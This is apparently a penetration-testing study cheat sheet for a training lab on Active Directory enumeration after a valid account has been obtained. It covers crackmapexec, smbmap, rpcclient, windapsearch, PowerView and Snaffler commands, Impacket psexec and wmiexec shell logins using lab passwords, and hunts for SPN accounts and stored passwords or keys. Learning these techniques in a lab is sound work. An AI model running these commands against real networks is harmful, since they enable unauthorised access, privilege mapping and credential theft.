# Credentials Enumeration

## Enumerate Users and Shares once we have a valid account

### From Linux

#### &#x20;Using Crackmapexec :

```
Domain User Enumeration :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --users

Domain Group Enumeration :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --groups

Logged On Users :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --loggedon-users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

Share Enumeration - Domain Controller :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --shares

Spider_plus :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/$TARGET.json
```

#### Using smbmap

```
SMBMap To Check Access :
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H $TARGET

Recursive List Of All Directories :
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H $TARGET -R 'Department Shares'
```

#### Using rpcclient

```
rpcclient -U "" -N $TARGET
--> Users enumeration
rpcclient $> enumdomusers
rpcclient $> queryuser <RID>
rpcclient $> querygroup <group_rid>
```

#### Using Impacket

```
To connect to a host with psexec.py :
psexec.py inlanefreight.local/wley:'transporter@4'@$TARGET  

Wmiexec.py utilizes a semi-interactive shell where commands are executed through WMI :
wmiexec.py inlanefreight.local/wley:'transporter@4'@$TARGET  
-> each command issued will execute a new cmd.exe from WMI
```

#### Using windapsearch

```
Windapsearch - Domain Admins :
python3 windapsearch.py --dc-ip $TARGET -u forend@inlanefreight.local -p Klmcargo2 --da

Windapsearch - Privileged Users :
python3 windapsearch.py --dc-ip $TARGET -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### From Windows

#### Using Powershell

```
Discover Modules :
PS C:\htb> Get-Module

Load ActiveDirectory Module :
Import-Module ActiveDirectory
Get-Module

Get Domain Info :
Get-ADDomain

Get-ADUser :
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Checking For Trust Relationships :
Get-ADTrust -Filter *

Group Enumeration :
Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators

Detailed Group Info :
Get-ADGroup -Identity "Backup Operators"

Group Membership :
Get-ADGroupMember -Identity "Backup Operators"

```

#### Using Powerview

```
Domain User Information :
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Recursive Group Membership :
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Trust Enumeration :
Get-DomainTrustMapping

Testing for Local Admin Access :
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 

Finding Users With SPN Set :
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

#### Using Sharpview

```
.\SharpView.exe Get-DomainUser -Help

Enumerate information about a specific user :
.\SharpView.exe Get-DomainUser -Identity forend
```

#### Enumerate shares using Snaffler

```
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

-> may find passwords, SSH keys, configuration files, or other data
```

